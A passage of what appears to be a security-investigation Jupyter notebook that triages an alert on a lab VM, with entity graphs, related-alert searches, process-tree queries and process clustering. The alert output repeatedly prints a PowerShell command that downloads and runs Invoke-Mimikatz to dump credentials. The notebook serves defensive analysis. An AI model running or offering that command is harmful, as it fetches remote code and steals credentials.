       "      <td></td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Type</th>\n",
       "      <td>SecurityAlert</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>CompromisedEntity</th>\n",
       "      <td>WINATTACKSIM</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table><br><h3>ExtendedProperties:</h3><table class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>0</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>Compromised Host</th>\n",
       "      <td>WINATTACKSIM</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>User Name</th>\n",
       "      <td>WINATTACKSIM\\AttackAdmin</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Account Session Id</th>\n",
       "      <td>0x1caf88b</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Suspicious Process</th>\n",
       "      <td>c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Suspicious Command Line</th>\n",
       "      <td>powershell.exe  \"iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/mattifestation/powersploit/master/exfiltration/invoke-mimikatz.ps1');invoke-mimikatz -dumpcreds\"</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Parent Process</th>\n",
       "      <td>c:\\windows\\system32\\cmd.exe</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Suspicious Process Id</th>\n",
       "      <td>0x1568</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Suspicious Script</th>\n",
       "      <td>powershell.exe  \"iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds\"</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>resourceType</th>\n",
       "      <td>Virtual Machine</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>ServiceId</th>\n",
       "      <td>14fa08c7-c48e-4c18-950c-8148024b4398</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>ReportingSystem</th>\n",
       "      <td>Azure</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>OccuringDatacenter</th>\n",
       "      <td>eastus</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table><h3>Entity counts: </h3>host: 1, account: 1, file: 2, process: 2, hostlogonsession: 1"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{ 'AdditionalData': {},\n",
      "  'AzureID': '/subscriptions/40dcc8bf-0478-4f3b-b275-ed0a94f2c013/resourceGroups/ASIHuntOMSWorkspaceRG/providers/Microsoft.Compute/virtualMachines/WinAttackSim',\n",
      "  'DnsDomain': '',\n",
      "  'HostName': 'WINATTACKSIM',\n",
      "  'IsDomainJoined': False,\n",
      "  'NTDomain': '',\n",
      "  'NetBiosName': 'WINATTACKSIM',\n",
      "  'OMSAgentID': 'e72f40cd-a7d2-4a41-8562-3f32da204b36',\n",
      "  'OSFamily': 'Windows',\n",
      "  'Type': 'host'}\n",
      "{ 'AdditionalData': {},\n",
      "  'Host': { 'AdditionalData': {},\n",
      "            'AzureID': '/subscriptions/40dcc8bf-0478-4f3b-b275-ed0a94f2c013/resourceGroups/ASIHuntOMSWorkspaceRG/providers/Microsoft.Compute/virtualMachines/WinAttackSim',\n",
      "            'DnsDomain': '',\n",
      "            'HostName': 'WINATTACKSIM',\n",
      "            'IsDomainJoined': False,\n",
      "            'NTDomain': '',\n",
      "            'NetBiosName': 'WINATTACKSIM',\n",
      "            'OMSAgentID': 'e72f40cd-a7d2-4a41-8562-3f32da204b36',\n",
      "            'OSFamily': 'Windows',\n",
      "            'Type': 'host'},\n",
      "  'IsDomainJoined': False,\n",
      "  'LogonId': '0x1caf88b',\n",
      "  'NTDomain': 'WinAttackSim',\n",
      "  'Name': 'AttackAdmin',\n",
      "  'Sid': 'S-1-5-21-3355618666-3700345348-2252427328-500',\n",
      "  'Type': 'account'}\n",
      "{ 'AdditionalData': {},\n",
      "  'Directory': 'c:\\\\windows\\\\system32',\n",
      "  'FullPath': 'c:\\\\windows\\\\system32\\\\cmd.exe',\n",
      "  'Name': 'cmd.exe',\n",
      "  'Type': 'file'}\n",
      "{ 'AdditionalData': {},\n",
      "  'CommandLine': '',\n",
      "  'Host': { 'AdditionalData': {},\n",
      "            'AzureID': '/subscriptions/40dcc8bf-0478-4f3b-b275-ed0a94f2c013/resourceGroups/ASIHuntOMSWorkspaceRG/providers/Microsoft.Compute/virtualMachines/WinAttackSim',\n",
      "            'DnsDomain': '',\n",
      "            'HostName': 'WINATTACKSIM',\n",
      "            'IsDomainJoined': False,\n",
      "            'NTDomain': '',\n",
      "            'NetBiosName': 'WINATTACKSIM',\n",
      "            'OMSAgentID': 'e72f40cd-a7d2-4a41-8562-3f32da204b36',\n",
      "            'OSFamily': 'Windows',\n",
      "            'Type': 'host'},\n",
      "  'ImageFile': { 'AdditionalData': {},\n",
      "                 'Directory': 'c:\\\\windows\\\\system32',\n",
      "                 'FullPath': 'c:\\\\windows\\\\system32\\\\cmd.exe',\n",
      "                 'Name': 'cmd.exe',\n",
      "                 'Type': 'file'},\n",
      "  'ProcessId': '0x1ae8',\n",
      "  'Type': 'process'}\n",
      "{ 'AdditionalData': {},\n",
      "  'Directory': 'c:\\\\windows\\\\system32\\\\windowspowershell\\\\v1.0',\n",
      "  'FullPath': 'c:\\\\windows\\\\system32\\\\windowspowershell\\\\v1.0\\\\powershell.exe',\n",
      "  'Name': 'powershell.exe',\n",
      "  'Type': 'file'}\n",
      "{ 'Account': { 'AdditionalData': {},\n",
      "               'Host': { 'AdditionalData': {},\n",
      "                         'AzureID': '/subscriptions/40dcc8bf-0478-4f3b-b275-ed0a94f2c013/resourceGroups/ASIHuntOMSWorkspaceRG/providers/Microsoft.Compute/virtualMachines/WinAttackSim',\n",
      "                         'DnsDomain': '',\n",
      "                         'HostName': 'WINATTACKSIM',\n",
      "                         'IsDomainJoined': False,\n",
      "                         'NTDomain': '',\n",
      "                         'NetBiosName': 'WINATTACKSIM',\n",
      "                         'OMSAgentID': 'e72f40cd-a7d2-4a41-8562-3f32da204b36',\n",
      "                         'OSFamily': 'Windows',\n",
      "                         'Type': 'host'},\n",
      "               'IsDomainJoined': False,\n",
      "               'LogonId': '0x1caf88b',\n",
      "               'NTDomain': 'WinAttackSim',\n",
      "               'Name': 'AttackAdmin',\n",
      "               'Sid': 'S-1-5-21-3355618666-3700345348-2252427328-500',\n",
      "               'Type': 'account'},\n",
      "  'AdditionalData': {},\n",
      "  'CommandLine': 'powershell.exe  \"iex (new-object '\n",
      "                 \"net.webclient).downloadstring('https://raw.githubusercontent.com/mattifestation/powersploit/master/exfiltration/invoke-mimikatz.ps1');invoke-mimikatz \"\n",
      "                 '-dumpcreds\"',\n",
      "  'CreationTimeUtc': '2019-09-12T21:37:27.4382577Z',\n",
      "  'ElevationToken': 'Default',\n",
      "  'Host': { 'AdditionalData': {},\n",
      "            'AzureID': '/subscriptions/40dcc8bf-0478-4f3b-b275-ed0a94f2c013/resourceGroups/ASIHuntOMSWorkspaceRG/providers/Microsoft.Compute/virtualMachines/WinAttackSim',\n",
      "            'DnsDomain': '',\n",
      "            'HostName': 'WINATTACKSIM',\n",
      "            'IsDomainJoined': False,\n",
      "            'NTDomain': '',\n",
      "            'NetBiosName': 'WINATTACKSIM',\n",
      "            'OMSAgentID': 'e72f40cd-a7d2-4a41-8562-3f32da204b36',\n",
      "            'OSFamily': 'Windows',\n",
      "            'Type': 'host'},\n",
      "  'ImageFile': { 'AdditionalData': {},\n",
      "                 'Directory': 'c:\\\\windows\\\\system32\\\\windowspowershell\\\\v1.0',\n",
      "                 'FullPath': 'c:\\\\windows\\\\system32\\\\windowspowershell\\\\v1.0\\\\powershell.exe',\n",
      "                 'Name': 'powershell.exe',\n",
      "                 'Type': 'file'},\n",
      "  'ParentProcess': { 'AdditionalData': {},\n",
      "                     'CommandLine': '',\n",
      "                     'Host': { 'AdditionalData': {},\n",
      "                               'AzureID': '/subscriptions/40dcc8bf-0478-4f3b-b275-ed0a94f2c013/resourceGroups/ASIHuntOMSWorkspaceRG/providers/Microsoft.Compute/virtualMachines/WinAttackSim',\n",
      "                               'DnsDomain': '',\n",
      "                               'HostName': 'WINATTACKSIM',\n",
      "                               'IsDomainJoined': False,\n",
      "                               'NTDomain': '',\n",
      "                               'NetBiosName': 'WINATTACKSIM',\n",
      "                               'OMSAgentID': 'e72f40cd-a7d2-4a41-8562-3f32da204b36',\n",
      "                               'OSFamily': 'Windows',\n",
      "                               'Type': 'host'},\n",
      "                     'ImageFile': { 'AdditionalData': {},\n",
      "                                    'Directory': 'c:\\\\windows\\\\system32',\n",
      "                                    'FullPath': 'c:\\\\windows\\\\system32\\\\cmd.exe',\n",
      "                                    'Name': 'cmd.exe',\n",
      "                                    'Type': 'file'},\n",
      "                     'ProcessId': '0x1ae8',\n",
      "                     'Type': 'process'},\n",
      "  'ProcessId': '0x1568',\n",
      "  'Type': 'process'}\n",
      "{ 'Account': { 'AdditionalData': {},\n",
      "               'Host': { 'AdditionalData': {},\n",
      "                         'AzureID': '/subscriptions/40dcc8bf-0478-4f3b-b275-ed0a94f2c013/resourceGroups/ASIHuntOMSWorkspaceRG/providers/Microsoft.Compute/virtualMachines/WinAttackSim',\n",
      "                         'DnsDomain': '',\n",
      "                         'HostName': 'WINATTACKSIM',\n",
      "                         'IsDomainJoined': False,\n",
      "                         'NTDomain': '',\n",
      "                         'NetBiosName': 'WINATTACKSIM',\n",
      "                         'OMSAgentID': 'e72f40cd-a7d2-4a41-8562-3f32da204b36',\n",
      "                         'OSFamily': 'Windows',\n",
      "                         'Type': 'host'},\n",
      "               'IsDomainJoined': False,\n",
      "               'LogonId': '0x1caf88b',\n",
      "               'NTDomain': 'WinAttackSim',\n",
      "               'Name': 'AttackAdmin',\n",
      "               'Sid': 'S-1-5-21-3355618666-3700345348-2252427328-500',\n",
      "               'Type': 'account'},\n",
      "  'AdditionalData': {},\n",
      "  'EndTimeUtc': '2019-09-12T21:37:27.4382577Z',\n",
      "  'Host': { 'AdditionalData': {},\n",
      "            'AzureID': '/subscriptions/40dcc8bf-0478-4f3b-b275-ed0a94f2c013/resourceGroups/ASIHuntOMSWorkspaceRG/providers/Microsoft.Compute/virtualMachines/WinAttackSim',\n",
      "            'DnsDomain': '',\n",
      "            'HostName': 'WINATTACKSIM',\n",
      "            'IsDomainJoined': False,\n",
      "            'NTDomain': '',\n",
      "            'NetBiosName': 'WINATTACKSIM',\n",
      "            'OMSAgentID': 'e72f40cd-a7d2-4a41-8562-3f32da204b36',\n",
      "            'OSFamily': 'Windows',\n",
      "            'Type': 'host'},\n",
      "  'SessionId': '0x1caf88b',\n",
      "  'StartTimeUtc': '2019-09-12T21:37:27.4382577Z',\n",
      "  'Type': 'hostlogonsession'}\n"
     ]
    }
   ],
   "source": [
    "# Extract entities and properties into a SecurityAlert class\n",
    "if alert_select is None or alert_select.selected_alert is None:\n",
    "    raise ValueError(\"Please select an alert before executing remaining cells.\")\n",
    "else:\n",
    "    security_alert = SecurityAlert(alert_select.selected_alert)\n",
    "    \n",
    "nbdisplay.display_alert(security_alert, show_entities=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Entity Graph\n",
    "Depending on the type of alert there may be one or more entities attached as properties. Entities are key indicators that we can pivot on during our investigation, such as Host, Account, IpAddress, Process, etc. - essentially the 'nouns' of security investigation. \n",
    "Entities are often related to other entities - for example a process will usually have a related file entity (the process image) and an Account entity (the context in which the process was running). Endpoint alerts typically always have a host entity (which could be a physical or virtual machine). In order to more effectively understand the links between related entities we can plot them as a graph."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 99,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-10-31T22:15:32.930265Z",
     "start_time": "2019-10-31T22:15:31.574465Z"
    },
    "scrolled": false
   },
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1080x1080 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Draw the graph using Networkx/Matplotlib\n",
    "%matplotlib inline\n",
    "alertentity_graph = security_alert_graph.create_alert_graph(security_alert)\n",
    "nbdisplay.draw_alert_entity_graph(alertentity_graph, width=15)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "## Related Alerts\n",
    "For certain entities in the alert we can search for other alerts that have that entity in common. Currently this pivot supports alerts with the same Host, Account or Process. \n",
    "\n",
    "**Notes:**\n",
    "- Some alert types do not include all of these entity types.\n",
    "- The original alert will be included in the \"Related Alerts\" set if it occurs within the query time boundary set below.\n",
    "\n",
    "In order to more effectively identify related alerts the query time boundaries can be adjusted to encompass a longer time frame."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 100,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-10-31T22:15:40.374811Z",
     "start_time": "2019-10-31T22:15:40.182792Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "HTML(value='<h4>Set query time boundaries</h4>')"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/plain": [
       "HBox(children=(DatePicker(value=datetime.date(2019, 9, 12), description='Origin Date'), Text(value='21:37:31',…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/plain": [
       "VBox(children=(IntRangeSlider(value=(-5, 1), description='Time Range (day):', layout=Layout(width='80%'), max=…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# set the origin time to the time of our alert\n",
    "query_times = nbwidgets.QueryTime(units='day', origin_time=security_alert.TimeGenerated, \n",
    "                            max_before=28, max_after=1, before=5)\n",
    "query_times.display()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 101,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-10-31T22:15:47.991081Z",
     "start_time": "2019-10-31T22:15:45.278158Z"
    },
    "scrolled": false
   },
   "outputs": [
    {
     "data": {
      "text/markdown": [
       "<p style=\"font-weight: bold; color: green;\">No related alerts found.</p>"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "if not security_alert.primary_host:\n",
    "    md_warn('Related alerts is not yet supported for alerts that are not host-based')\n",
    "    related_alerts = None\n",
    "else:\n",
    "    related_alerts = qry_prov.SecurityAlert.list_related_alerts(query_times, security_alert)\n",
    "\n",
    "\n",
    "    if related_alerts is not None and not related_alerts.empty:\n",
    "        host_alert_items = related_alerts\\\n",
    "            .query('host_match == @True')[['AlertType', 'StartTimeUtc']]\\\n",
    "            .groupby('AlertType').StartTimeUtc.agg('count').to_dict()\n",
    "        acct_alert_items = related_alerts\\\n",
    "            .query('acct_match == @True')[['AlertType', 'StartTimeUtc']]\\\n",
    "            .groupby('AlertType').StartTimeUtc.agg('count').to_dict()\n",
    "        proc_alert_items = related_alerts\\\n",
    "            .query('proc_match == @True')[['AlertType', 'StartTimeUtc']]\\\n",
    "            .groupby('AlertType').StartTimeUtc.agg('count').to_dict()\n",
    "\n",
    "        def print_related_alerts(alertDict, entityType, entityName):\n",
    "            if len(alertDict) > 0:\n",
    "                print('Found {} different alert types related to this {} (\\'{}\\')'\n",
    "                      .format(len(alertDict), entityType, entityName))\n",
    "                for (k,v) in alertDict.items():\n",
    "                    print('    {}, Count of alerts: {}'.format(k, v))\n",
    "            else:\n",
    "                print('No alerts for {} entity \\'{}\\''.format(entityType, entityName))\n",
    "\n",
    "        print_related_alerts(host_alert_items, 'host', security_alert.hostname)\n",
    "        print_related_alerts(acct_alert_items, 'account', \n",
    "                             security_alert.primary_account.qualified_name \n",
    "                             if security_alert.primary_account\n",
    "                             else None)\n",
    "        print_related_alerts(proc_alert_items, 'process', \n",
    "                             security_alert.primary_process.ProcessFilePath \n",
    "                             if security_alert.primary_process\n",
    "                             else None)\n",
    "        nbdisp.display_timeline(data=related_alerts, source_columns = ['AlertName'], title='Alerts', height=100)\n",
    "    else:\n",
    "        md('No related alerts found.', styles=[\"bold\",\"green\"])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Show these related alerts on a graph\n",
    "To see the how these alerts relate to our original alert, and how these new alerts relate to each other we can graph them."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 102,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-10-31T22:15:51.965473Z",
     "start_time": "2019-10-31T22:15:51.921123Z"
    },
    "scrolled": false
   },
   "outputs": [
    {
     "data": {
      "text/markdown": [
       "<p style=\"font-weight: bold; color: green;\">No related alerts found.</p>"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Draw a graph of this (add to entity graph)\n",
    "%matplotlib notebook\n",
    "%matplotlib inline\n",
    "\n",
    "if related_alerts is not None and not related_alerts.empty:\n",
    "    rel_alert_graph = mas.add_related_alerts(related_alerts=related_alerts,\n",
    "                                             alertgraph=alertentity_graph)\n",
    "    nbdisplay.draw_alert_entity_graph(rel_alert_graph, width=15)\n",
    "else:\n",
    "    md('No related alerts found.', styles=[\"bold\",\"green\"])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Browse List of Related Alerts\n",
    "Once we have understood how these alerts related to each other, we can view the details of each new, related alert."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 103,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-10-31T22:15:54.731323Z",
     "start_time": "2019-10-31T22:15:54.669283Z"
    },
    "scrolled": false
   },
   "outputs": [
    {
     "data": {
      "text/markdown": [
       "<p style=\"font-weight: bold; color: green;\">No related alerts found.</p>"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "def disp_full_alert(alert):\n",
    "    global related_alert\n",
    "    related_alert = SecurityAlert(alert)\n",
    "    nbdisplay.display_alert(related_alert, show_entities=True)\n",
    "\n",
    "if related_alerts is not None and not related_alerts.empty:\n",
    "    related_alerts['CompromisedEntity'] = related_alerts['Computer']\n",
    "    print('Selected alert is available as \\'related_alert\\' variable.')\n",
    "    rel_alert_select = nbwidgets.AlertSelector(alerts=related_alerts, action=disp_full_alert)\n",
    "    rel_alert_select.display()\n",
    "else:\n",
    "    md('No related alerts found.', styles=[\"bold\",\"green\"])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Get Process Tree\n",
    "If the alert has a process entity this section tries to retrieve the entire process tree to which that process belongs.\n",
    "\n",
    "Notes:\n",
    "- The alert must have a process entity\n",
    "- Only processes started within the query time boundary will be included\n",
    "- Ancestor and descented processes are retrieved to two levels (i.e. the parent and grandparent of the alert process plus any child and grandchild processes).\n",
    "- Sibling processes are the processes that share the same parent as the alert process\n",
    "- This can be a long-running query, especially if a wide time window is used! Caveat Emptor!\n",
    "\n",
    "The source (alert) process is shown in red.\n",
    "\n",
    "What's shown for each process:\n",
    "- Each process line is indented according to its position in the tree hierarchy\n",
    "- Top line fields:\n",
    "  - \\[relationship to source process:lev# - where # is the hops away from the source process\\]\n",
    "  - Process creation date-time (UTC)\n",
    "  - Process Image path\n",
    "  - PID - Process Id\n",
    "  - SubjSess - the session Id of the process spawning the new process\n",
    "  - TargSess - the new session Id if the process is launched in another context/session. If 0/0x0 then the process is launched in the same session as its parent\n",
    "- Second line fields:\n",
    "  - Process command line\n",
    "  - Account - name of the account context in which the process is running"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 104,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-10-31T22:15:56.630401Z",
     "start_time": "2019-10-31T22:15:56.420948Z"
    },
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "HTML(value='<h4>Set query time boundaries</h4>')"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/plain": [
       "HBox(children=(DatePicker(value=datetime.date(2019, 9, 12), description='Origin Date'), Text(value='21:37:31',…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/plain": [
       "VBox(children=(IntRangeSlider(value=(-60, 10), description='Time Range (min):', layout=Layout(width='80%'), mi…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# set the origin time to the time of our alert\n",
    "query_times = nbwidgets.QueryTime(units='minute', origin_time=security_alert.origin_time)\n",
    "query_times.display()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 112,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-10-31T22:33:40.55496Z",
     "start_time": "2019-10-31T22:33:38.049983Z"
    },
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/markdown": [
       "<p style=\"color: blue; font-weight: bold;\">No processes were returned so cannot obtain a process tree Skip.</p>"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/markdown": [
       "<p style=\"color: blue; font-weight: bold;\">Go to [Other Processes](#process_clustering) section later in the notebook to retrieve all processes</p>"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "if security_alert.data_family != DataFamily.WindowsSecurity:\n",
    "    raise ValueError('The remainder of this notebook currently only supports Windows. '\n",
    "                     'Linux support is in development but not yet implemented.')\n",
    "\n",
    "def extract_missing_pid(security_alert):\n",
    "    for pid_ext_name in ['Process Id', 'Suspicious Process Id']:\n",
    "        pid = security_alert.ExtendedProperties.get(pid_ext_name, None)\n",
    "        if pid:\n",
    "            return pid\n",
    "\n",
    "def extract_missing_sess_id(security_alert):\n",
    "    sess_id = security_alert.ExtendedProperties.get('Account Session Id', None)\n",
    "    if sess_id:\n",
    "        return sess_id\n",
    "    for session in [e for e in security_alert.entities if\n",
    "                    e['Type'] == 'host-logon-session' or e['Type'] == 'hostlogonsession']:\n",
    "        return session['SessionId']\n",
    "            \n",
    "if (security_alert.primary_process):\n",
    "    # Do some patching up if the process entity doesn't have a PID\n",
    "    pid = security_alert.primary_process.ProcessId\n",
    "    if not pid:\n",
    "        pid = extract_missing_pid(security_alert)\n",
    "        if pid:\n",
    "            security_alert.primary_process.ProcessId = pid\n",
    "        else:\n",
    "            raise ValueError('Could not find the process Id for the alert process.')\n",
    "    \n",
    "    # Do the same if we can't find the account logon ID\n",
    "    if not security_alert.get_logon_id():\n",
    "        sess_id = extract_missing_sess_id(security_alert)\n",
    "        if sess_id and security_alert.primary_account:\n",
    "            security_alert.primary_account.LogonId = sess_id\n",
    "        else:\n",
    "            raise ValueError('Could not find the session Id for the alert process.')\n",
    "    \n",
    "    # run the query\n",
    "    process_tree = qry_prov.WindowsSecurity.get_process_tree(query_times, security_alert, process_id=pid,logon_session_id=sess_id,host_name='WINATTACKSIM',process_name='powershell.exe')\n",
    "\n",
    "    if len(process_tree) > 0:\n",
    "        # Print out the text view of the process tree\n",
    "        nbdisplay.display_process_tree(process_tree)\n",
    "    else:\n",
    "        md('No processes were returned so cannot obtain a process tree Skip.', styles=[\"blue\",\"bold\"])\n",
    "        md('Go to [Other Processes](#process_clustering) section later in the notebook to retrieve all processes', styles=[\"blue\",\"bold\"])\n",
    "else:\n",
    "    md('This alert has no process entity so cannot obtain a process tree.', styles=[\"blue\",\"bold\"])\n",
    "    md('Skip to [Other Processes](#process_clustering) later in the notebook to retrieve all processes', styles=[\"bold\",\"large\"])\n",
    "    process_tree = None"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Process Time Line\n",
    "As well as seeing the processes involved in a tree we want to see the chronology of this process execution. This shows each process in the process tree on a time line view.\n",
    "If a large number of processes are involved in this process tree it may take some time to display this time line graphic."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 85,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-10-31T22:06:29.346905Z",
     "start_time": "2019-10-31T22:06:29.33138Z"
    },
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "# Show timeline of events\n",
    "if process_tree is not None and not process_tree.empty:\n",
    "    nbdisplay.display_timeline(data=process_tree, alert=security_alert, \n",
    "                            title='Alert Process Session', height=250)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Other Processes on Host - Clustering\n",
    "Sometimes you don't have a source process from which to build our investigation. Other times it's just useful to see what other process activity is occurring on the host. This section retrieves all processes on the host within the time bounds\n",
    "set in the query times widget.\n",
    "\n",
    "If you want to view the raw details of this process data display the *processes_on_host* dataframe.\n",
    "\n",
    "In order to more effectively analyze this process data we can cluster processes into distinct process clusters.\n",
    "To do this we process the raw event list output to extract a few features that render strings (such as commandline)into numerical values. The default below uses the following features:\n",
    "- commandLineTokensFull - this is a count of common delimiters in the commandline \n",
    "  (given by this regex r'[\\s\\-\\\\/\\.,\"\\'|&amp;:;%$()]'). The aim of this is to capture the commandline structure while ignoring variations on what is essentially the same pattern (e.g. temporary path GUIDs, target IP or host names, etc.)\n",
    "- pathScore - this sums the ordinal (character) value of each character in the path (so /bin/bash and /bin/bosh would have similar scores).\n",
    "- isSystemSession - 1 if this is a root/system session, 0 if anything else.\n",
    "\n",
    "Then we run a clustering algorithm (DBScan in this case) on the process list. The result groups similar (noisy) processes together and leaves unique process patterns as single-member clusters."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Clustered Processes"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 168,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-10-31T22:59:12.665242Z",
     "start_time": "2019-10-31T22:59:03.340697Z"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Number of input events: 811\n",
      "Number of clustered events: 37\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 864x216 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "from msticpy.sectools.eventcluster import dbcluster_events, add_process_features\n",
    "\n",
    "processes_on_host = None\n",
    "if security_alert.primary_host:\n",
    "    processes_on_host = qry_prov.WindowsSecurity.list_processes_in_session(query_times, security_alert,process_id=pid,logon_session_id=sess_id,host_name=security_alert.ExtendedProperties['Compromised Host'],process_name='powershell.exe')\n",
    "\n",
    "    if processes_on_host is not None and not processes_on_host.empty:\n",
    "        feature_procs = add_process_features(input_frame=processes_on_host,\n",
    "                                             path_separator=security_alert.path_separator)\n",
    "\n",
    "        # you might need to play around with the max_cluster_distance parameter.\n",
    "        # decreasing this gives more clusters.\n",
    "        (clus_events, dbcluster, x_data) = dbcluster_events(data=feature_procs,\n",
    "                                                            cluster_columns=['commandlineTokensFull', \n",
    "                                                                             'pathScore', \n",
    "                                                                             'isSystemSession'],\n",
    "                                                            max_cluster_distance=0.0001)\n",
    "        print('Number of input events:', len(feature_procs))\n",
    "        print('Number of clustered events:', len(clus_events))\n",
    "        clus_events[['ClusterSize', 'processName']][clus_events['ClusterSize'] > 1].plot.bar(x='processName', \n",
    "                                                                                             title='Process names with Cluster > 1', \n",
    "                                                                                             figsize=(12,3));\n",
    "if processes_on_host is None or processes_on_host.empty:\n",
    "    md('Unable to obtain any processes for this host. This feature is currently only supported for Windows hosts.', styles=[\"blue\",\"bold\"])\n",
    "    md('If this is a Windows host skip to [Host Logons](#host_logons) later in the notebook to examine logon events.', styles=[\"bold\",\"large\"])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Variability in Command Lines and Process Names\n",
    "In this section we display a number of charts highlighting the variability of command lines and processes paths associated with each process. \n",
    "\n",
    "The top chart shows the variability of command line content for a given process name. The wider the box, the more instances were found with different command line structure. For certain processes such as cmd.exe or powershell.exe a wide variability in command lines could be expected, however with other processes this could be considered abnormal.\n",
    "\n",
    "Note, the 'structure' in this case is measured by the number of tokens or delimiters in the command line and does not look at content differences. This is done so that commonly varying instances of the same command line are grouped together.<br>\n",
    "For example `updatepatch host1.mydom.com` and `updatepatch host2.mydom.com` will be grouped together.\n",
    "\n",
    "\n",
    "The second graph shows processes by variation in the full path associated with the process. This does compare content so `c:\\windows\\system32\\net.exe` and `e:\\windows\\system32\\net.exe` are treated as distinct. You would normally not expect to see any variability in this chart unless you have multiple copies of the same name executable or an executable is trying masquerade as another well-known binary."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 114,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-10-31T22:35:16.112962Z",
     "start_time": "2019-10-31T22:35:09.631608Z"
    },
    "scrolled": false
   },
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 720x720 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 814.3x720 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Looking at the variability of commandlines and process image paths\n",
